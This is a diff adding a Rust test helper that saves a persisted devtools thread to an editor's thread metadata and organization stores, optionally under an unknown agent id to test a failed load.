+/// A devtools thread of `root` that exists only in the stores (saved with a session, marked),
+/// never opened in this run. Its agent is the window's own agent, or — with `unknown_agent` — an
+/// agent id no server provides, so loading it fails.
+fn persisted_devtools_thread(
+    win: &Win,
+    root: &str,
+    unknown_agent: Option<&'static str>,
+    cx: &mut TestAppContext,
+) -> String {
+    let thread_id = crate::thread_metadata_store::ThreadId::new();
+    let project = win
+        .workspace
+        .read_with(&win.cx, |workspace, _| workspace.project().clone());
+    let active = crate::test_support::active_thread_id(&win.panel, &win.cx);
+    cx.update(|cx| {
+        let store = crate::thread_metadata_store::ThreadMetadataStore::global(cx);
+        let own_agent = store
+            .read(cx)
+            .entry(active)
+            .map(|metadata| metadata.agent_id.clone())
+            .expect("the window's thread has metadata");
+        let agent = match unknown_agent {
+            Some(name) => name.into(),
+            None => own_agent,
+        };
+        let metadata = crate::thread_metadata_store::ThreadMetadata {
+            thread_id,
+            session_id: Some(agent_client_protocol::v2::schema::SessionId::new(format!(
+                "persisted-{}",
+                thread_id.to_key_string()
+            ))),
+            agent_id: agent,
+            title: Some("Persisted devtools thread".into()),
+            title_override: None,
+            updated_at: chrono::Utc::now(),
+            created_at: None,
+            interacted_at: None,
+            worktree_paths: project.read(cx).worktree_paths(cx),
+            archived: false,
+            remote_connection: None,
+        };
+        store.update(cx, |store, cx| store.save(metadata, cx));
+    });
+    cx.run_until_parked();
+    cx.update(|cx| {
+        crate::thread_organization::ThreadOrganizationStore::global(cx).update(cx, |store, cx| {
+            store
+                .set_devtools_root(thread_id, PathBuf::from(root), cx)
+                .expect("a saved thread can carry the mark");
+        })
+    });
+    cx.run_until_parked();
+    thread_id.to_key_string()
+}
+
